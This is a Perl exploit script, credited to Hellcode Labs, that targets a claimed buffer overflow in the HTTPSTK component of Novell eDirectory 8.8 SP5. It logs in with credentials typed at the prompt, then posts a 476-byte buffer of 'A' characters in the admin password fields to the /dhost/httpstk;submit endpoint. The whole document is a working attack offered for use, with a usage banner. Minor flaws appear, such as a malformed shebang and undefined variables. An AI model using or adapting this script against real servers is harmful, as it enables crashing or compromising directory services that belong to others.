#!usr\bin\perl
# Novell eDirectory 8.8 SP5 HTTPSTK BoF Vuln - 0day
# Vulnerability found in Hellcode Labs.
# karak0rsan || murderkey
# info[at]hellcode.net || www.hellcode.net


use WWW::Mechanize; 

use LWP::Debug qw(+);

use HTTP::Cookies;
use HTTP::Request::Common;; 

$target=$ARGV[0]; 


if(!$ARGV[0]){

        print "Novell eDirectory 8.8 SP5 Exploit\n";

        print "Hellcode Research || Hellcode.net\n";

        print "Usage:perl $0 [target]\n";
	
exit();
}
	  print "Username:";

	  $username = <STDIN>;
          
          chomp($username);
	  
	  print "Password:";

 	  $password = <STDIN>;

	  chomp($password); 


$login_url = "$target/_LOGIN_SERVER_";

$url = "$target/dhost/httpstk;submit";

$buffer = "\x41" x 476;
 
my $mechanize = WWW::Mechanize->new();


$mechanize->cookie_jar(HTTP::Cookies->new(file => "$cookie_file",autosave => 1));


$mechanize->timeout($url_timeout); 

$res = $mechanize->request(HTTP::Request->new('GET', "$login_url")); 


    $mechanize->submit_form( 

                  form_name => "authenticator", 

                  fields    => {        
            
                     usr => $username, 

                     pwd => $password}, 

                     button => 'Login'); 

$res2 = $mechanize->request(HTTP::Request->new('GET', "$url"));
$res2 = $mechanize->request(POST "$url", [sadminpwd => $buffer, verifypwd => $buffer]);
